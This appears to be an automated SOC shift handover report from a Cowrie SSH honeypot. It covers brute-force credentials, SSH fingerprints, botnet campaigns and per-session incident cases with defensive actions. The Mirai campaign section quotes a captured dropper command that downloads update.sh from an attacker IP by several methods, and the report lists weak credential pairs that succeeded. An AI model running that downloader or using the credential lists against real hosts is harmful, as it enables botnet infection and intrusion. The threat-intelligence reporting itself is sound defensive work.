# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-22 |
| **Generated At** | 2026-11-22T18:50:04Z |
| **Shift Time** | 18:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **426** |
| Confirmed Threats | **350** |
| False Positives Filtered | **76** (17.8%) |
| Unique Attacker IPs | **191** |
| Countries of Origin | **44** |
| High Severity Cases | **216** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **210** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **550** |
| Unique Credential Pairs | **369** |
| Unique Usernames | **142** |
| Unique Passwords | **282** |
| Successful Auth Pairs | **441** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 155 |
| `admin` | 79 |
| `support` | 29 |
| `nobody` | 21 |
| `git` | 14 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 34 |
| `support` | 27 |
| `admin` | 26 |
| `123456` | 18 |
| `password` | 15 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 27 |
| `nobody` | `` | 21 |
| `admin` | `admin` | 17 |
| `git` | `git` | 14 |
| `usuario` | `usuario` | 14 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1234` | `195.178.110.232` | 2026-11-22T02:55:16 |
| `git` | `git` | `10.0.0.73` | 2026-11-22T02:58:28 |
| `git` | `git` | `80.94.95.118` | 2026-11-22T02:58:50 |
| `usuario` | `usuario` | `138.226.239.234` | 2026-11-22T02:59:00 |
| `nobody` | `` | `138.226.239.234` | 2026-11-22T02:59:46 |
| `usuario` | `usuario` | `138.226.239.233` | 2026-11-22T02:59:50 |
| `nobody` | `` | `10.0.0.73` | 2026-11-22T03:01:46 |
| `mysql` | `` | `10.0.0.73` | 2026-11-22T03:01:51 |
| `nobody` | `` | `138.226.239.233` | 2026-11-22T03:03:44 |
| `admin` | `1qaz2wsx` | `80.94.95.118` | 2026-11-22T03:03:54 |
| `admin` | `admin` | `35.210.54.245` | 2026-11-22T03:08:28 |
| `admin` | `2222` | `10.0.0.73` | 2026-11-22T03:17:39 |
| `ubuntu` | `123321` | `109.160.32.116` | 2026-11-22T03:18:15 |
| `developer` | `root` | `109.160.32.116` | 2026-11-22T03:18:20 |
| `root` | `A123456a` | `109.160.32.116` | 2026-11-22T03:18:25 |
| `root` | `Long!@#123` | `109.160.32.116` | 2026-11-22T03:18:31 |
| `username` | `password` | `109.160.32.116` | 2026-11-22T03:18:36 |
| `root` | `Admin123` | `109.160.32.116` | 2026-11-22T03:18:41 |
| `ubuntu` | `data@123` | `109.160.32.116` | 2026-11-22T03:18:47 |
| `user1` | `password123456789` | `109.160.32.116` | 2026-11-22T03:18:52 |
_… 421 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **426** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 188 |
| OpenSSH | 8 |
| Unknown | 6 |
| libssh | 5 |
| PuTTY | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 135 | 4 |
| `7d01d047ace6...` | Mirai/variant | 19 | 3 |
| `eff4c24daffc...` | Modern SSH client | 8 | 1 |
| `16443846184e...` | Generic scanner | 5 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 4 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 135 | 4 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 19 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 8 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 5 | 3 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 4 | 4 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 4 | 4 | — |
| `084386fa7ae5...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 3 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **144** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `206.189.40.120`, `169.128.70.53`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://211.230.3.71/update.sh -O ./.k9up 2>/dev/null; curl -s http://211.230.3.71/update.sh -o ./.k9up 2>/dev/null; busybox wget -q http://211.230.3.71/update.sh -O ./.k9up 2>/dev/null; python -c "import urllib; urllib.urlretrieve('http://211.230.3.71/update.sh', './.k9up')" 2>/dev/null; python3 -c "import urllib.request as u; u.urlretrieve('http://211.230.3.71/update.sh', './.k9up')" 2>/dev/null; tftp 211.230.3.71 -c get update.sh 2>/dev/null &
```
Source IPs: `211.230.3.71`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **191** |
| Unique ASNs | **71** |
| High-Risk ASNs | **43** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 41 | HIGH |
| `AS20473` | The Constant Company, LLC | 30 | HIGH |
| `AS14061` | DigitalOcean, LLC | 10 | HIGH |
| `AS63949` | Akamai Connected Cloud | 9 | HIGH |
| `AS15169` | Google LLC | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 7 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS398324` | Censys, Inc. | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (204)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8d469115de35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-11-22 02:55 |
| **Last Seen** | 2026-11-22 02:55 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ddeaa22af5136b5e9427e29e544e3fef_small_control'"'"' '"'"'check_ddeaa22af5136b5e9427e29e544e3fef'"'"'', printf '\n%s|%s\n' 'check_ddeaa22af5136b5e9427e29e544e3fef_small_control' 'check_ddeaa22af5136b5e9427e29e544e3fef', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_ddeaa22af5136b5e9427e29e544e3fef_small_math'"'"' "$((979*884+66))"', (979*884+66, printf '\n%s|%s\n' 'check_ddeaa22af5136b5e9427e29e544e3fef_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 02:55:08` | `cowrie.session.connect` |
| `2026-11-22 02:55:09` | `cowrie.client.version` |
| `2026-11-22 02:55:09` | `cowrie.client.kex` |
| `2026-11-22 02:55:16` | `cowrie.login.success` |
| `2026-11-22 02:55:19` | `cowrie.client.size` |
| `2026-11-22 02:55:21` | `cowrie.session.params` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| `2026-11-22 02:55:23` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50660708a473

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-22 02:58 |
| **Last Seen** | 2026-11-22 02:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 02:58:49` | `cowrie.session.connect` |
| `2026-11-22 02:58:49` | `cowrie.client.version` |
| `2026-11-22 02:58:50` | `cowrie.client.kex` |
| `2026-11-22 02:58:50` | `cowrie.login.success` |
| `2026-11-22 02:58:50` | `cowrie.direct-tcpip.request` |
| `2026-11-22 02:58:50` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 02:58:50` | `cowrie.direct-tcpip.data` |
| `2026-11-22 02:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b114bf7b38d

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-22 02:58 |
| **Last Seen** | 2026-11-22 02:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 02:58:59` | `cowrie.session.connect` |
| `2026-11-22 02:58:59` | `cowrie.client.version` |
| `2026-11-22 02:58:59` | `cowrie.client.kex` |
| `2026-11-22 02:59:00` | `cowrie.login.success` |
| `2026-11-22 02:59:00` | `cowrie.direct-tcpip.request` |
| `2026-11-22 02:59:00` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 02:59:00` | `cowrie.direct-tcpip.data` |
| `2026-11-22 02:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4607d2fcd323

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-22 02:59 |
| **Last Seen** | 2026-11-22 02:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 02:59:49` | `cowrie.session.connect` |
| `2026-11-22 02:59:49` | `cowrie.client.version` |
| `2026-11-22 02:59:49` | `cowrie.client.kex` |
| `2026-11-22 02:59:50` | `cowrie.login.success` |
| `2026-11-22 02:59:50` | `cowrie.direct-tcpip.request` |
| `2026-11-22 02:59:50` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 02:59:50` | `cowrie.direct-tcpip.data` |
| `2026-11-22 02:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68309946d2fe

| Field | Detail |
|---|---|
| **Source IP** | `35.210.54[.]245` |
| **First Seen** | 2026-11-22 03:08 |
| **Last Seen** | 2026-11-22 03:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:08:26` | `cowrie.session.connect` |
| `2026-11-22 03:08:26` | `cowrie.client.version` |
| `2026-11-22 03:08:26` | `cowrie.client.kex` |
| `2026-11-22 03:08:28` | `cowrie.login.success` |
| `2026-11-22 03:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.54[.]245` to AbuseIPDB if not already reported
- [ ] Block `35.210.54[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997ae72228cf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]116` |
| **First Seen** | 2026-11-22 03:18 |
| **Last Seen** | 2026-11-22 03:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:18:13` | `cowrie.session.connect` |
| `2026-11-22 03:18:13` | `cowrie.client.version` |
| `2026-11-22 03:18:13` | `cowrie.client.kex` |
| `2026-11-22 03:18:15` | `cowrie.login.success` |
| `2026-11-22 03:18:16` | `cowrie.session.params` |
| `2026-11-22 03:18:16` | `cowrie.command.input` |
| `2026-11-22 03:18:16` | `cowrie.log.closed` |
| `2026-11-22 03:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]116` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0685ae7ecd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]6` |
| **First Seen** | 2026-11-22 03:21 |
| **Last Seen** | 2026-11-22 03:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept-Encoding: identity, Accept: */*, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:21:40` | `cowrie.session.connect` |
| `2026-11-22 03:21:40` | `cowrie.login.success` |
| `2026-11-22 03:21:41` | `cowrie.session.params` |
| `2026-11-22 03:21:41` | `cowrie.command.input` |
| `2026-11-22 03:21:41` | `cowrie.command.input` |
| `2026-11-22 03:21:41` | `cowrie.command.failed` |
| `2026-11-22 03:21:41` | `cowrie.command.input` |
| `2026-11-22 03:21:41` | `cowrie.command.failed` |
| `2026-11-22 03:21:41` | `cowrie.command.input` |
| `2026-11-22 03:21:41` | `cowrie.command.failed` |
| `2026-11-22 03:21:41` | `cowrie.command.input` |
| `2026-11-22 03:21:41` | `cowrie.log.closed` |
| `2026-11-22 03:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]6` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-867f5de4db33

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]247` |
| **First Seen** | 2026-11-22 03:25 |
| **Last Seen** | 2026-11-22 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept-Encoding: identity, Accept: */*, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:25:37` | `cowrie.session.connect` |
| `2026-11-22 03:25:37` | `cowrie.login.success` |
| `2026-11-22 03:25:38` | `cowrie.session.params` |
| `2026-11-22 03:25:38` | `cowrie.command.input` |
| `2026-11-22 03:25:38` | `cowrie.command.input` |
| `2026-11-22 03:25:38` | `cowrie.command.failed` |
| `2026-11-22 03:25:38` | `cowrie.command.input` |
| `2026-11-22 03:25:38` | `cowrie.command.failed` |
| `2026-11-22 03:25:38` | `cowrie.command.input` |
| `2026-11-22 03:25:38` | `cowrie.command.failed` |
| `2026-11-22 03:25:38` | `cowrie.command.input` |
| `2026-11-22 03:25:38` | `cowrie.log.closed` |
| `2026-11-22 03:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]247` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]247` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4080b488cf42

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]6` |
| **First Seen** | 2026-11-22 03:35 |
| **Last Seen** | 2026-11-22 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:35:02` | `cowrie.session.connect` |
| `2026-11-22 03:35:02` | `cowrie.login.success` |
| `2026-11-22 03:35:03` | `cowrie.session.params` |
| `2026-11-22 03:35:03` | `cowrie.command.input` |
| `2026-11-22 03:35:03` | `cowrie.log.closed` |
| `2026-11-22 03:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]6` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00caedbe6ca7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-22 03:35 |
| **Last Seen** | 2026-11-22 03:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:35:57` | `cowrie.session.connect` |
| `2026-11-22 03:35:57` | `cowrie.client.version` |
| `2026-11-22 03:35:57` | `cowrie.client.kex` |
| `2026-11-22 03:35:58` | `cowrie.login.success` |
| `2026-11-22 03:35:58` | `cowrie.direct-tcpip.request` |
| `2026-11-22 03:35:58` | `cowrie.direct-tcpip.data` |
| `2026-11-22 03:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4781f3add878

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]247` |
| **First Seen** | 2026-11-22 03:35 |
| **Last Seen** | 2026-11-22 03:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:35:59` | `cowrie.session.connect` |
| `2026-11-22 03:35:59` | `cowrie.login.success` |
| `2026-11-22 03:36:00` | `cowrie.session.params` |
| `2026-11-22 03:36:00` | `cowrie.command.input` |
| `2026-11-22 03:36:00` | `cowrie.log.closed` |
| `2026-11-22 03:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]247` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff0aaa69bf7

| Field | Detail |
|---|---|
| **Source IP** | `169.128.70[.]53` |
| **First Seen** | 2026-11-22 03:40 |
| **Last Seen** | 2026-11-22 03:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:40:22` | `cowrie.session.connect` |
| `2026-11-22 03:40:22` | `cowrie.login.success` |
| `2026-11-22 03:40:23` | `cowrie.session.params` |
| `2026-11-22 03:40:23` | `cowrie.command.input` |
| `2026-11-22 03:40:24` | `cowrie.command.input` |
| `2026-11-22 03:40:24` | `cowrie.command.input` |
| `2026-11-22 03:40:26` | `cowrie.command.input` |
| `2026-11-22 03:40:26` | `cowrie.command.failed` |
| `2026-11-22 03:40:26` | `cowrie.log.closed` |
| `2026-11-22 03:40:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.128.70[.]53` to AbuseIPDB if not already reported
- [ ] Block `169.128.70[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72805a9cd6eb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-11-22 03:44 |
| **Last Seen** | 2026-11-22 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 03:44:18` | `cowrie.session.connect` |
| `2026-11-22 03:44:18` | `cowrie.client.version` |
| `2026-11-22 03:44:18` | `cowrie.client.kex` |
| `2026-11-22 03:44:18` | `cowrie.login.success` |
| `2026-11-22 03:44:18` | `cowrie.direct-tcpip.request` |
| `2026-11-22 03:44:18` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 03:44:18` | `cowrie.direct-tcpip.data` |
| `2026-11-22 03:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10b986908d1

| Field | Detail |
|---|---|
| **Source IP** | `193.187.110[.]158` |
| **First Seen** | 2026-11-22 04:19 |
| **Last Seen** | 2026-11-22 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 04:19:00` | `cowrie.session.connect` |
| `2026-11-22 04:19:00` | `cowrie.client.version` |
| `2026-11-22 04:19:00` | `cowrie.client.kex` |
| `2026-11-22 04:19:00` | `cowrie.login.success` |
| `2026-11-22 04:19:00` | `cowrie.direct-tcpip.request` |
| `2026-11-22 04:19:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-11-22 04:19:00` | `cowrie.direct-tcpip.data` |
| `2026-11-22 04:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.187.110[.]158` to AbuseIPDB if not already reported
- [ ] Block `193.187.110[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76f3cfe7866

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-22 04:52 |
| **Last Seen** | 2026-11-22 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 04:52:37` | `cowrie.session.connect` |
| `2026-11-22 04:52:37` | `cowrie.client.version` |
| `2026-11-22 04:52:37` | `cowrie.client.kex` |
| `2026-11-22 04:52:38` | `cowrie.login.success` |
| `2026-11-22 04:52:38` | `cowrie.direct-tcpip.request` |
| `2026-11-22 04:52:38` | `cowrie.direct-tcpip.data` |
| `2026-11-22 04:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51efa74469a

| Field | Detail |
|---|---|
| **Source IP** | `45.32.129[.]154` |
| **First Seen** | 2026-11-22 04:56 |
| **Last Seen** | 2026-11-22 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 04:56:10` | `cowrie.session.connect` |
| `2026-11-22 04:56:10` | `cowrie.client.version` |
| `2026-11-22 04:56:10` | `cowrie.client.kex` |
| `2026-11-22 04:56:10` | `cowrie.login.success` |
| `2026-11-22 04:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.32.129[.]154` to AbuseIPDB if not already reported
- [ ] Block `45.32.129[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3c3ea5f930

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:02 |
| **Last Seen** | 2026-11-22 05:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e6ba159a089fe20e3c4b6cb4063e72c_small_control'"'"' '"'"'check_8e6ba159a089fe20e3c4b6cb4063e72c'"'"'', printf '\n%s|%s\n' 'check_8e6ba159a089fe20e3c4b6cb4063e72c_small_control' 'check_8e6ba159a089fe20e3c4b6cb4063e72c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8e6ba159a089fe20e3c4b6cb4063e72c_small_math'"'"' "$((568*675+85))"', (568*675+85, printf '\n%s|%s\n' 'check_8e6ba159a089fe20e3c4b6cb4063e72c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:02:15` | `cowrie.session.connect` |
| `2026-11-22 05:02:16` | `cowrie.client.version` |
| `2026-11-22 05:02:16` | `cowrie.client.kex` |
| `2026-11-22 05:02:21` | `cowrie.login.success` |
| `2026-11-22 05:02:23` | `cowrie.client.size` |
| `2026-11-22 05:02:24` | `cowrie.session.params` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| `2026-11-22 05:02:28` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
